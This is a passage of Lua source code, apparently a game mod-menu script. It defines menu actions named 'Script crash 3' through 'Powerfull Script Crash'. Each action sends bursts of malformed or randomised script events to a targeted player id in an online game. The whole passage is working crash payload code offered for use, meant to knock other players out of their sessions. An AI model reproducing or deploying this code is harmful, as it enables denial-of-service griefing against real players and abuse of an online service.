        for i = 1, 150 do
            util.trigger_script_event(1 << pid, {0xA4D43510, pid, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
    end)

    menu.action(ryzecrash, "Script crash 3", {"scrashv3"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 150 do
            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        end
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        end
        util.yield(100)
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
    end)

    menu.action(ryzecrash, "Script crash 4", {"scrashv4"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(ryzecrash, "Script crash 5", {"scrashv5"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, pid, math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)

    menu.divider(ryzecrash, "More script crashes")

    menu.action(ryzecrash, "Script crash 6", {"scrashv6"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-1733737974, pid, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    
    end)

    menu.action(ryzecrash, "Script crash 7", {"scrashv7"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(ryzecrash, "Script crash 8", {"scrashv8"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
                util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
                util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(ryzecrash, "Script crash 9", {"scrashv9"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(ryzecrash, "Powerfull Script Crash", {"scrashv10"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
                util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
                util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
                util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
                util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
                util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
                util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
                util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
                util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
                util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
                util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
                util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
                util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
                util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
                util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
                util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
                util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
                util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
                util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
                util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
                util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
                util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
                util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
                util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
                util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
                util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
